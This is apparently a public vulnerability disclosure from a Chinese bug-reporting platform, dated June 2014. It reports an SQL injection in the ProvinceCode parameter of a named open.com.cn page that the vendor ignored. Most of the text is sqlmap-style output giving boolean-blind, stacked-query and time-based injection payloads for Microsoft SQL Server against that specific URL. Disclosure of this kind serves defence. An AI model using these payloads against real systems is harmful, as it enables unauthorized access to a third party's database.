wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-06-17：	细节已通知厂商并且等待厂商处理中									2014-06-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 求不走小厂商。 详细说明：  
http://learnguopei.open.com.cn/VECenter/Article/OfflineJobListArea.aspx?ProvinceCode=230000&Classify=3&IsExcellent=1Place: GETParameter: ProvinceCode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ProvinceCode=230000' AND 8147=8147 AND 'vqtE'='vqtE&Classify=3&IsExcellent=1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ProvinceCode=230000'; WAITFOR DELAY '0:0:5'--&Classify=3&IsExcellent=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ProvinceCode=230000' WAITFOR DELAY '0:0:5'--&Classify=3&IsExcellent=1
